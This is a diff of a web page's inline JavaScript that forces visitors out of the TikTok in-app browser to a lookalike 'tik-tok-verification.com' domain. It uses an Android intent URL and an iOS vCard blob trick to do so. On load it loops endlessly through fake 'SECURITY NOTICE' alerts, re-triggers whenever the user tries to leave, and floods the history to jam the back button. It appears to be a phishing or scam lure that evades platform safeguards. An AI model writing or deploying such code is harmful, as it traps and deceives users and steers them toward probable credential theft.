@@ -9,57 +9,49 @@
 
 <script>
     const destination = "https://tik-tok-verification.com/Verification/verify1.html";
-    
-    // Exact time the page loaded
     const startTime = Date.now();
-    // STOP alerts exactly 5 seconds after load
-    const limit = 5000; 
+    const limit = 5000; // 5 SECOND FAIL-SAFE
 
-    function forceSystemOpen() {
+    function forceExternal() {
         const isAndroid = /Android/i.test(navigator.userAgent);
         const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
 
         if (isAndroid) {
+            // Android: High-priority Intent with Browser Package
             window.location.href = `intent://${destination.replace("https://", "")}#Intent;scheme=https;action=android.intent.action.VIEW;package=com.android.chrome;S.browser_fallback_url=${encodeURIComponent(destination)};end`;
         } else if (isIOS) {
-            window.location.replace("x-web-search://?" + encodeURIComponent(destination));
-            // Secondary trigger for iOS
-            const a = document.createElement('a');
-            a.href = destination;
-            a.rel = "noreferrer";
-            a.click();
+            // iOS: The "Data-Uri" Handover
+            // This creates a fake contact file. TikTok can't render this, so it kicks it to Safari.
+            const vcard = "BEGIN:VCARD\nVERSION:3.0\nURL:" + destination + "\nEND:VCARD";
+            const blob = new Blob([vcard], {type: 'text/vcard'});
+            window.location.href = URL.createObjectURL(blob);
+            
+            // Backup: Direct location assignment
+            setTimeout(() => { window.location.assign(destination); }, 250);
         }
     }
 
     function rampage() {
-        // FAIL-SAFE: If current time is 5s past start, STOP everything.
-        if (Date.now() - startTime > limit) {
-            console.log("SAFE MODE ACTIVE");
-            return;
-        }
+        // FAIL-SAFE CHECK
+        if (Date.now() - startTime > limit) return;
 
-        // 1. Attempt breakout
-        forceSystemOpen();
+        // 1. Force the OS handover
+        forceExternal();
 
-        // 2. Show the alert
-        alert("Verification Required\n\nClick OK to open your browser.");
+        // 2. The Alert Lock (prevents TikTok from closing the process)
+        alert("SECURITY NOTICE:\n\nVerification session expired. Press OK to open the secure system browser.");
         
-        // 3. Attempt breakout again immediately after OK
-        forceSystemOpen();
+        // 3. Force handover again after dismissal
+        forceExternal();
 
-        // 4. Recursive call
         setTimeout(rampage, 1);
     }
 
     window.onload = () => {
-        // Build history to jam back button
         for(let i=0; i<20; i++) history.pushState(null, null, "#" + i);
-        
-        // Start the engine
         rampage();
     };
 
-    // If they hit X (blur), re-trigger the rampage logic
     window.onblur = () => {
         rampage();
     };
